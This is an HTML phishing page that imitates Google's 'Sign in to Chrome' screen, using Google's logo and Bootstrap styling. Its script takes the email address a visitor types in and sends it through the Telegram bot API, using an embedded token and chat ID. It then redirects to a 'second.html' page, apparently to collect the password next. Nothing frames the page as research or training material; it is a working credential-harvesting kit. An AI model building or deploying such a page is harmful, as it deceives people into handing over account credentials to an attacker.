<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to Chrome</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            animation: fadeIn 1s ease-in;
        }
        
        .card {
            border: none;
            width: 100%;
            animation: slideUp 0.7s ease-out;
        }
        
        .small-link {
            font-size: 0.875rem;
        }
        
        @media (min-width: 576px) {
            .card-wrapper {
                max-width: 400px;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container d-flex justify-content-center align-items-center min-vh-100">
        <div class="card card-wrapper p-4 shadow rounded-4">
            <div class="text-center mb-3">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" height="30">
                <h5 class="mt-3 mb-1">Sign in to Chrome</h5>
                <p class="text-muted small">Use your Google Account</p>
            </div>

            <form id="loginForm">
                <div class="mb-3">
                    <input type="email" class="form-control" id="email" placeholder="Email or phone" required>
                </div>
                <div class="mb-2 text-start">
                    <a href="#" class="text-primary small-link">Forgot email?</a>
                </div>

                <div class="mb-3 text-start small text-muted">
                    Not your computer? Use Guest mode to sign in privately.<br>
                    <a href="#" class="text-primary small-link">Learn more about using Guest mode</a>
                </div>

                <div class="d-flex justify-content-between align-items-center">
                    <a href="#" class="text-primary small-link">Create account</a>
                    <button type="submit" class="btn btn-primary px-4">Next</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();

            if (email) {
                // Replace these with your real values
                const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
                const chatId = '5615316142';

                const message = `ðŸ“§ New email submitted: ${email}`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => {
                    if (response.ok) {
                        window.location.href = `second.html?email=${encodeURIComponent(email)}`;
                    } else {
                        alert("Failed to send message. Please try again.");
                    }
                }).catch(error => {
                    console.error('Error sending to Telegram:', error);
                    alert("Error connecting to Telegram.");
                });
            }
        });
    </script>
</body>

</html>
